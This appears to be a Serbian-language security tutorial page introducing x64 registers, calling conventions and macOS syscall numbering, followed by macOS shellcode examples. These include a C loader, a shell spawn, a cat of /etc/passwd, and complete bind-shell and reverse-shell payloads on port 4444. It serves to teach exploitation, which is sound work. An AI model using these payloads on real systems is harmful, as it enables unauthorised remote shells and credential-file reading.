# Uvod u x64

{{#include ../../../banners/hacktricks-training.md}}

## **Uvod u x64**

x64, poznat i kao x86-64, jeste 64-bitna arhitektura procesora koja se pretežno koristi u desktop i serverskom računarstvu. Nastala je iz x86 arhitekture koju je proizveo Intel, a kasnije ju je AMD usvojio pod nazivom AMD64. Danas je to najzastupljenija arhitektura u personalnim računarima i serverima.

### **Registri**

x64 proširuje x86 arhitekturu i poseduje **16 registara opšte namene** označenih kao `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` i `r8` do `r15`. Svaki od njih može da čuva vrednost od **64 bita** (8 bajtova). Ovi registri takođe imaju 32-bitne, 16-bitne i 8-bitne podregistre radi kompatibilnosti i obavljanja specifičnih zadataka.

1. **`rax`** - Tradicionalno se koristi za **povratne vrednosti** funkcija.
2. **`rbx`** - Često se koristi kao **bazni registar** za memorijske operacije.
3. **`rcx`** - Uobičajeno se koristi za **brojače petlji**.
4. **`rdx`** - Koristi se u različitim ulogama, uključujući proširene aritmetičke operacije.
5. **`rbp`** - **Bazni pokazivač** stack frame-a.
6. **`rsp`** - **Stack pointer**, koji prati vrh stack-a.
7. **`rsi`** i **`rdi`** - Koriste se za **source** i **destination** indekse u string/memorijskim operacijama.
8. **`r8`** do **`r15`** - Dodatni registri opšte namene uvedeni u x64.

### **Pozivna konvencija**

Pozivna konvencija za x64 razlikuje se između operativnih sistema. Na primer:

- **Windows**: Prva **četiri parametra** prosleđuju se u registre **`rcx`**, **`rdx`**, **`r8`** i **`r9`**. Dodatni parametri se postavljaju na stack. Povratna vrednost nalazi se u **`rax`**.
- **System V (koji se često koristi u UNIX-like sistemima)**: Prvih **šest celobrojnih parametara ili parametara pokazivača** prosleđuju se u registre **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** i **`r9`**. Povratna vrednost se takođe nalazi u **`rax`**.

Ako funkcija ima više od šest ulaznih parametara, **preostali će biti prosleđeni na stack**. **RSP**, stack pointer, mora biti **poravnat na 16 bajtova**, što znači da adresa na koju pokazuje mora biti deljiva sa 16 pre izvršavanja bilo kog poziva. To znači da bismo obično morali da obezbedimo da je RSP pravilno poravnat u našem shellcode-u pre nego što izvršimo poziv funkcije. Međutim, u praksi system calls često funkcionišu čak i kada ovaj zahtev nije ispunjen.

### Pozivna konvencija u Swift-u

Swift ima sopstvenu **pozivnu konvenciju**, koja se može pronaći na [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Uobičajene instrukcije**

x64 instrukcije imaju bogat skup, uz očuvanje kompatibilnosti sa ranijim x86 instrukcijama i uvođenje novih.

- **`mov`**: **Premešta** vrednost iz jednog **registra** ili **memorijske lokacije** u drugi.
- Primer: `mov rax, rbx` — Premešta vrednost iz `rbx` u `rax`.
- **`push`** i **`pop`**: Postavljaju vrednosti na **stack** ili ih uklanjaju sa njega.
- Primer: `push rax` — Postavlja vrednost iz `rax` na stack.
- Primer: `pop rax` — Učitava vrednost sa vrha stack-a u `rax`.
- **`add`** i **`sub`**: Operacije **sabiranja** i **oduzimanja**.
- Primer: `add rax, rcx` — Sabira vrednosti u `rax` i `rcx`, a rezultat smešta u `rax`.
- **`mul`** i **`div`**: Operacije **množenja** i **deljenja**. Napomena: imaju specifično ponašanje u pogledu korišćenja operanada.
- **`call`** i **`ret`**: Koriste se za **pozivanje funkcija** i **povratak iz njih**.
- **`int`**: Koristi se za pokretanje softverskog **prekida**. Npr., `int 0x80` se koristio za system calls u 32-bitnom x86 Linux-u.
- **`cmp`**: **Upoređuje** dve vrednosti i postavlja CPU zastavice na osnovu rezultata.
- Primer: `cmp rax, rdx` — Upoređuje `rax` sa `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: Instrukcije za **uslovni skok** koje menjaju tok izvršavanja na osnovu rezultata prethodnog `cmp` ili testiranja.
- Primer: Nakon instrukcije `cmp rax, rdx`, `je label` — Skače na `label` ako je `rax` jednak `rdx`.
- **`syscall`**: Koristi se za **system calls** na nekim x64 sistemima (kao što je savremeni Unix).
- **`sysenter`**: Optimizovana instrukcija za **system calls** na nekim platformama.

### **Prolog funkcije**

1. **Postavljanje starog baznog pokazivača na stack**: `push rbp` (čuva bazni pokazivač pozivaoca)
2. **Premeštanje trenutnog stack pointer-a u bazni pokazivač**: `mov rbp, rsp` (postavlja novi bazni pokazivač za trenutnu funkciju)
3. **Alociranje prostora na stack-u za lokalne promenljive**: `sub rsp, <size>` (gde je `<size>` broj potrebnih bajtova)

### **Epilog funkcije**

1. **Premeštanje trenutnog baznog pokazivača u stack pointer**: `mov rsp, rbp` (oslobađa lokalne promenljive)
2. **Uklanjanje starog baznog pokazivača sa stack-a**: `pop rbp` (obnavlja bazni pokazivač pozivaoca)
3. **Povratak**: `ret` (vraća kontrolu pozivaocu)

## macOS

### syscalls

Postoje različite klase syscalls, a [**možete ih pronaći ovde**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Zatim, možete pronaći broj svakog syscall-a [**na ovom URL-u**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Dakle, da biste pozvali `open` syscall (**5**) iz **Unix/BSD class**, potrebno je da mu dodate: `0x2000000`

Dakle, broj syscall-a za pozivanje open bio bi `0x2000005`

### Shellcodes

Za kompajliranje:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Za izdvajanje bajtova:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>C kod za testiranje shellcode-a</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto [**odavde**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i objašnjeno.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Čitanje pomoću cat-a

Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (što u memoriji predstavlja stek adresa).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Pozivanje komande pomoću sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell sa [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) na **portu 4444**<sup>[[2]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell sa [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell ka **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## Reference

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
